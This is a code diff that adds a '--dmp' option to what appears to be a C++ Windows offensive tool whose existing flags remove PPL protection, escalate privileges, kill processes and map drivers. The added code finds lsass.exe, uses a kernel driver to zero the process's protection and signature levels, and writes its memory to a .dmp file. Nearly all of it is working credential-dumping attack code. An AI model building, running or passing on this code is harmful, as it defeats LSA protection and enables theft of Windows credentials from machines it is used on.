@@ -2,6 +2,9 @@
 #include <winternl.h>
 #include <stdint.h>
 #include <iostream>
+#include <filesystem>
+#include <tlhelp32.h>
+#include <tchar.h>
 #include "Log.hpp"
 #include "Utils.hpp"
 #include "MappingDriverBin.hpp"
@@ -106,22 +109,22 @@ GetObjectPointer(
 	NTSTATUS	Status{ STATUS_SUCCESS };
 
 	while ((Status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
-											   pHandleInfo,
-											   ulBytes,
-											   &ulBytes)) == 0xC0000004L)
+		pHandleInfo,
+		ulBytes,
+		&ulBytes)) == 0xC0000004L)
 	{
 		if (pHandleInfo != NULL)
 		{
 			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(),
-																  HEAP_ZERO_MEMORY,
-																  pHandleInfo,
-																  (size_t)2 * ulBytes);
+				HEAP_ZERO_MEMORY,
+				pHandleInfo,
+				(size_t)2 * ulBytes);
 		}
 		else
 		{
 			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
-																HEAP_ZERO_MEMORY,
-																(size_t)2 * ulBytes);
+				HEAP_ZERO_MEMORY,
+				(size_t)2 * ulBytes);
 		}
 	}
 
@@ -151,6 +154,39 @@ done:
 
 
 	return Ret;
+}
+
+static
+DWORD 
+GetLsassPid()
+{
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE)
+	{
+		printf("CreateToolhelp32Snapshot 失败: %lu\n", GetLastError());
+		return 0;
+	}
+
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	DWORD lsassPid = 0;
+
+	if (Process32First(hSnapshot, &pe32))
+	{
+		do
+		{
+			// 不区分大小写比较进程名
+			if (_tcsicmp(pe32.szExeFile, _T("lsass.exe")) == 0)
+			{
+				lsassPid = pe32.th32ProcessID;
+				break;  // lsass 通常只有一个实例
+			}
+		} while (Process32Next(hSnapshot, &pe32));
+	}
+
+	CloseHandle(hSnapshot);
+	return lsassPid;
 }
 
 
@@ -237,6 +273,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	BOOLEAN bAdd{ FALSE };	// true add false remove
 	BOOLEAN bPrivilegeEscalation{ FALSE };
 	BOOLEAN bKillProcess{ FALSE };
+	BOOLEAN bDumpLsass{ FALSE };
 	ULONG nTargetPid{ 0 };
 
 	BOOLEAN bMapping{ FALSE };
@@ -304,6 +341,11 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 			bMapping = TRUE;
 		}
 
+		else if (arg == "--dmp")
+		{
+			bDumpLsass = TRUE;
+		}
+
 		else if (arg == "-h" || arg == "--help")
 		{
 			SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
@@ -312,7 +354,8 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 				<< "  --ppl -rve <PID>      移除 PPL 保护\n"
 				<< "  --PriEsc <PID>        权限提升\n"
 				<< "  --KillProcess <PID>   结束进程\n"
-				<< "  --map <路径>           映射驱动\n";
+				<< "  --map <路径>           映射驱动\n"
+				<< "  --dmp                 dmp lsass\n";
 			SetConsoleTextAttribute(hConsole, 7);
 			return 0;
 		}
@@ -418,6 +461,116 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 			} while (FALSE);
 		}
 	}
+	else if (bDumpLsass)
+	{
+		// get lsass pid and handle object
+
+		do 
+		{
+			// Get lsass.exe pid 
+			DWORD dwPid = GetLsassPid();
+			if (!dwPid)
+			{
+				LOG("GetLsassPid failed line :" << __LINE__);
+				break;
+			}
+			
+			auto hTmpProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
+			if (!hTmpProcess)
+			{
+				hTmpProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
+				if (!hTmpProcess)
+				{
+					LOG("Open Tmp Process failed" << GetLastError());
+					break;
+				}
+			}
+
+			ULONG64 processObject{};
+			auto result = GetObjectPointer(&processObject, dwPid, hTmpProcess);
+			if (!processObject)
+			{
+				LOG("GetObjectPointer failed!!!");
+				break;
+			}
+
+			// Get Protection
+			auto backupProtection = DriverLoader::GetProcessProtection(processObject, ProtectionOffset);
+
+			// remove protection
+			DriverLoader::PS_PROTECTION protection{0};
+			
+			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset, &protection);
+			if (!result)
+			{
+				LOG("remove protection failed!!!");
+				break;
+			}
+
+			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset - 1, &protection);
+			if (!result)
+			{
+				LOG("remove SectionSignatureLevel failed!!!");
+				break;
+			}
+
+			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset - 2, &protection);
+			if (!result)
+			{
+				LOG("remove SignatureLevel failed!!!");
+				break;
+			}
+
+			auto hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
+			if (!hProcess)
+			{
+				LOG("PROCESS_QUERY_INFORMATION | PROCESS_VM_READ FAILED code " << GetLastError());
+				hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
+				if (!hProcess)
+				{
+					LOG("Open Process with PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ failed" << GetLastError());
+					break;
+				}
+			}
+
+
+			auto currentPath = std::filesystem::current_path();
+			std::string strDumpFileName = "dumpLsass_" + std::to_string(std::time(nullptr));
+			auto fullPath = currentPath / strDumpFileName;
+			fullPath.replace_extension(".dmp");
+
+			std::string dumpFile = fullPath.string();
+
+			HANDLE hFile = CreateFileA(dumpFile.c_str(),
+									   GENERIC_WRITE, 
+									   0, 
+									   NULL,
+									   CREATE_ALWAYS,
+									   FILE_ATTRIBUTE_NORMAL, 
+									   NULL);
+			if (INVALID_HANDLE_VALUE == hFile)
+			{
+				LOG("CreateFileA Failed!!!");
+				break;
+			}
+
+			if (!DriverLoader::DumpLsass(hProcess,
+										 dwPid, 
+										 hFile))
+			{
+				LOG("DumpLsass Failed!!!");
+				//break;
+			}
+			
+			system("pause");
+
+			DriverLoader::SetProcessProtection(processObject, ProtectionOffset, &backupProtection);
+
+		} while (FALSE);
+
+	}
+
+
 	
 	DriverWorker::UninitializeDriver();
 
